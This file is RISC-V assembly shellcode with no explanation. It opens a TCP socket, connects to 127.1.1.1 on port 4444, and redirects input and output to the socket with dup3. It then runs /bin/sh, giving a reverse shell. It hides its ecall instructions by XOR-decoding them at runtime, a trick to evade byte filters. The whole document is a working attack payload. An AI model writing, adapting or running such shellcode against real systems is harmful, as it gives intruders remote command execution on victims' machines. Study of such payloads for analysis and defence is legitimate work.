.section .text
.global _start

.equ PORT, 0x5c11 # 4444
.equ IP, 0x0101017f # 127.1.1.1

_start:
    c.j getaddr

    main:
        # forge ecall instruction (0x000000e3)
        # *ecall ^= 0xffffffff
        c.li s0, -1
        lw s1, -0xa(ra)
        xor s1, s0, s1
        sw s1, -0xa(ra)
        addi s2, ra, -0xa

        # socket(AF_INET, SOCK_STREAM, 0) (2, 1, 0)

        li a0, 2
        li a1, 1
        li a2, 0

        li a7, 198 # SYS_socket
        jalr s2

        sw a0, -0x14(sp)

        # connect(sockfd, &saddr, 0x10)
        li a2, 0x10

        li a1, 0x2
        sh a1, -0x10(sp)

        li a1, PORT
        sh a1, -0xe(sp)

        li a1, IP
        sw a1, -0xc(sp)

        add a1, sp, -0x10

        c.addi a7, 5 # SYS_connect
        jalr s2

        # dup3(clientfd, [0, 1], 0)
        li a2, 0
        li a7, (0x100 + 24)
        andi a7, a7, 0x2ff # SYS_dup3

        lw a0, -0x14(sp)
        li a1, 0
        jalr s2

        lw a0, -0x14(sp)
        c.addi a1, 1
        jalr s2

        # execve("/bin/sh", NULL, NULL)
        li a1, 0
        sb a1, -1(s2)
        add a0, s2, -0x8

        li a7, 221
        jalr s2

    binsh:
        .ascii "/bin/sh"
        .byte 0xff
    ecall:
        .byte 0x8c, 0xff, 0xff, 0xff
        ret
    getaddr:
        call main
